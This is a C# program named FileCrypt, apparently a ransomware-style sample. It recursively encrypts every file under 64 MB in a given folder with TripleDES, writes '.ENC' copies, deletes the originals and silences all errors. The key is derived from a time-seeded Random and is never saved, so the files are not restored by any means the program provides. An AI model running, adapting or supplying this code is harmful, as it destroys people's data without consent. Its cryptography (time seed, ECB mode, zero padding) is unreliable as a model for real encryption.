using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace FileCrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                byte[] key = GenerateKey(24);
                string[] files = Directory.GetFiles(args[0], "*", SearchOption.AllDirectories);
                foreach (string file in files)
                {
                    Encryptor.EncryptFile(file, key);
                }
            }
        }

        public static byte[] GenerateKey(int len)
        {
            int Time = (int)DateTimeOffset.UtcNow.ToUnixTimeSeconds();
            Encryptor.Signature = BitConverter.GetBytes(Time);
            
            Random r = new Random(Time);
            byte[] key = new byte[len];
            for (int i = 0; i<len; i++)
            {
                key[i] = (byte)r.Next(0, 255);
            }
            return key;

        }

        
    }
    public static class Encryptor
    {
        public static byte[] Signature = null;
        private static byte[] Encrypt(byte[] toEncrypt, byte[] key)
        {
            TripleDESCryptoServiceProvider tdes = new TripleDESCryptoServiceProvider();
            List<byte> K = new List<byte>();
            K = key.ToList();
            while (K.Count < 24)
            {
                K.Add(0x00);
            }
            key = K.ToArray();
            tdes.Key = key;
            tdes.Mode = CipherMode.ECB;
            tdes.Padding = PaddingMode.Zeros;
            ICryptoTransform cTransform = tdes.CreateEncryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(toEncrypt, 0, toEncrypt.Length);
            tdes.Clear();
            return resultArray;
        }
        public static void EncryptFile(string filepath, byte[] key)
        {
            if (filepath.EndsWith(".ENC")) return;
            if (File.Exists(filepath + ".ENC")) return;
            FileInfo fi = new FileInfo(filepath);
            long len = fi.Length;
            byte[] lenBytes = BitConverter.GetBytes(len);
            int Offset = 0;
            if (len > 1024 * 1024 * 64)
            {
                return;
            }
            try
            {
                using (var fr = File.Open(filepath, FileMode.Open, FileAccess.Read))
                {
                    using (var fw = File.Open(filepath + ".ENC", FileMode.Create, FileAccess.Write))
                    {
                        fw.Write(Signature, 0, Signature.Length);
                        fw.Write(lenBytes, 0, lenBytes.Length);
                        while (true)
                        {
                            byte[] buffer = new byte[512];
                            int tbf = 0;
                            fr.Position = Offset;
                            try
                            {
                                tbf = fr.Read(buffer, 0, 512);
                            }
                            catch
                            {
                                break;
                            }
                            if (tbf != 0)
                            {
                                byte[] newByte = Encrypt(buffer, key);
                                fw.Write(newByte, 0, 512);
                                Offset += tbf;
                            }
                            else
                            {
                                break;
                            }
                        }
                        fw.Flush();
                        
                    }
                }
                File.Delete(filepath);
            } catch
            {
            }
        }
    }
}
